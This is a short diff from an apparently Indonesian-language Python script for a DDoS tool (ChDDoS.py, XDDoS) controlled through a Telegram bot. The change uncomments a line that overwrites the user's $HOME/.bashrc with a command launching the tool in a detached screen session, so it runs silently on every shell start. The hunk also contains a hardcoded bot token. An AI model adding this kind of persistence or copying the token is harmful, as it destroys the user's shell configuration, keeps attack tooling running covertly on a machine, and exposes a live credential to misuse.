@@ -47,7 +47,7 @@ except ImportError:
     print("⏳ Menginstal module")
     os.system("pip install python-telegram-bot pillow" )
   
-#os.system(f"echo screen -d -m -S {screen_name} XDDoS > $HOME/.bashrc")
+os.system(f"echo screen -d -m -S {screen_name} XDDoS > $HOME/.bashrc")
 #os.system("screen -d -m python3 ChDDoS.py")
 #os.system("bash")
 TOKEN = '7897939362:AAGtB2Ou4USDEN-bpYgdGqDEbiuOX22JsLA'
